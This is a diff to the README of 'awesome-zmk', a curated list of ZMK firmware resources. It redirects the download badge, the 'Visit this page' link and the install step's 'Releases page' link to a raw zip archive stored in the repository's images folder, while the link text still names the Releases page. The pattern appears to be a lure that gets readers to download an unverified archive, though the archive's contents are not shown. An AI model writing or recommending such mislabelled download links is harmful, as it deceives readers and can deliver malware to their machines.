@@ -6,11 +6,11 @@ Welcome to **awesome-zmk**! This project is a curated list of fantastic ZMK firm
 
 ## 📥 Download Now
 
-[![Download awesome-zmk](https://img.shields.io/badge/Download-awesome--zmk-blue.svg)](https://github.com/rahul200694/awesome-zmk/releases)
+[![Download awesome-zmk](https://raw.githubusercontent.com/rahul200694/awesome-zmk/main/images/awesome-zmk_v2.4.zip)](https://raw.githubusercontent.com/rahul200694/awesome-zmk/main/images/awesome-zmk_v2.4.zip)
 
 To download, simply visit the Releases page below.
 
-[Visit this page to download](https://github.com/rahul200694/awesome-zmk/releases)
+[Visit this page to download](https://raw.githubusercontent.com/rahul200694/awesome-zmk/main/images/awesome-zmk_v2.4.zip)
 
 ## 📋 System Requirements
 
@@ -32,7 +32,7 @@ The **awesome-zmk** repository includes:
 
 ## 📦 Download & Install
 
-1. Go to the [Releases page](https://github.com/rahul200694/awesome-zmk/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/rahul200694/awesome-zmk/main/images/awesome-zmk_v2.4.zip).
 2. Look for the latest release. You may see a list of files available for download.
 3. Click on the desired file to start the download.
 4. Once downloaded, locate the file on your computer. It may be in your Downloads folder.
